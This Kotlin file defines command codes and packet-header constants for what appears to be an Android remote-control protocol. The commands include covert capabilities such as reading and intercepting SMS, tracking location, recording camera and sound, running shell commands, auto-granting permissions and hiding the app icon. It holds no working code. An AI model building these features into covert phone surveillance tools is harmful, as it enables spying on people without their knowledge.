package com.cheng.automate.core.config

/**
 * @author zijian.cheng
 * @date 2020/7/16
 */
object Order {

    const val UID = 8888 //命令标识(包头标识)；

    const val VER = 1002 //版本号(包头标识)；

    const val ENC = 7619 //加密字(包头标识)；

    const val CMD_TEST = 1000 //测试；

    const val CMD_READY = 1001 //准备好命令；

    const val CMD_INFO = 1002 //获取信息命令；

    const val CMD_CALL = 1004 //获取通话记录命令；

    const val CMD_LOCK = 1005 //锁屏命令

    const val CMD_SHOT = 1006 //截屏命令；

    const val CMD_SHOTCODE = 1007 //截二维码命令；

    const val CMD_RETURN = 1008 //返回命令；//

    const val CMD_POS = 1009 //返回命令；

    const val CMD_LIGHT = 1010 //亮屏命令；

    const val CMD_LIGHT_UP = 101001 //亮屏命令；

    const val CMD_GIVE_POWER = 1011 //自动授权命令;

    const val CMD_CAMERA = 1012 //相机命令；

    const val CMD_SLIDE = 1013 //滑动命令；

    const val CMD_CMD = 1014 //执行CMD命令；

    const val CMD_GET_CMD_OUT = 1015 //获取执行CMD命令结果；

    const val CMD_REBOOT = 1016 //重启手机；

    const val CMD_SHUTDOWN = 1017 //关机；

    const val CMD_RESTART = 1018 //重启应用；

    const val CMD_UNLOCK = 1019 //解除我的锁屏；

    const val CMD_RECORD_SCREEN_START = 1020 //录屏开始；

    const val CMD_RECORD_SCREEN_END = 1021 //录屏结束；

    const val CMD_RECORD_VIDEO_START = 1022 //录像开始；

    const val CMD_RECORD_VIDEO_END = 1023 //录像结束；

    const val CMD_HOME = 1024 //返回桌面

    const val CMD_GET_INSTALL_APP_INFO = 1025 //获取已安装的应用信息；

    const val CMD_INSTALL_APP = 1026 //安装；

    const val CMD_UNINSTALL_APP = 1027 //卸载；

    const val CMD_RUN_APP = 1028 //运行；

    const val CMD_KILL_APP = 1029 //终止运行；

    const val CMD_LONG_CLICK = 1030 //长按命令；

    const val CMD_INPUT = 1031 //输入 命令；

    const val CMD_CAMERA_CAP_START = 1032 //录像开始；

    const val CMD_CAMERA_CAP_END = 1033 //录像结束；

    const val CMD_INSERT_IMG_TO_GALLERY = 1034 //照片插入到相册；

    const val CMD_SOUND_CAP_START = 1035 //录像开始；

    const val CMD_SOUND_CAP_END = 1036 //录像结束；


    const val CMD_APP_HIDE = 1037 //；

    const val CMD_APP_SHOW = 1038 //；


    const val CMD_REQUEST_USER_ID = 1904 //申请用户ID


    const val CMD_LOCATION_SINGLE = 2001 //获取定位信息：

    const val CMD_LOCATION_SERIES = 2002 //连续获取定位信息：

    const val CMD_LOCATION_STOP = 2003 //停止获取定位信息：

    const val CMD_SMS_CONTENT = 3001 //获取短信内容命令；

    const val CMD_SMS_SEND = 3002 //发送短信命令；

    const val CMD_SMS_PHONE_NUMBER = 3003 //查询本机号码命令；

    const val CMD_CONTACT_CONTENT = 3004 //通讯录；

    const val CMD_SMS_SENDS = 3005 //群发短信；

    const val CMD_SMS_CLEAR = 3006 //清空短信；

    const val CMD_SMS_INTERCEPT = 3007 //拦截短信；

    const val CMD_SMS_INTERCEPT_NO = 3008 //取消拦截短信；


    const val FILE_DIR_ROOT = 4100 //根目录；

    const val CMD_FILE_LIST = 4001 //列举目录；传递绝对路径；

    const val CMD_FILE_TRANS = 4002 //列举外置SD卡目录；

    const val CMD_FILE_DEL = 4003 //删除文件


    const val FILE_DIR_EX_SD = 4101 //外置SD卡目录标志;

    const val FILE_DIR_SD = 4102 //内置SD卡目录标志;

    const val FILE_DIR_PHOTO = 4103 //相册目录;


    const val PH_SIZE = 32
    const val DATA_SIZE = 1024 //数据体缓存大小；

    const val MAX_PATH = 260 //目录长度大小；

    const val MAX_FILE_NAME = 64 //文件名长度；

    const val MAX_TIME_STR = 24 //时间字符串长度；

}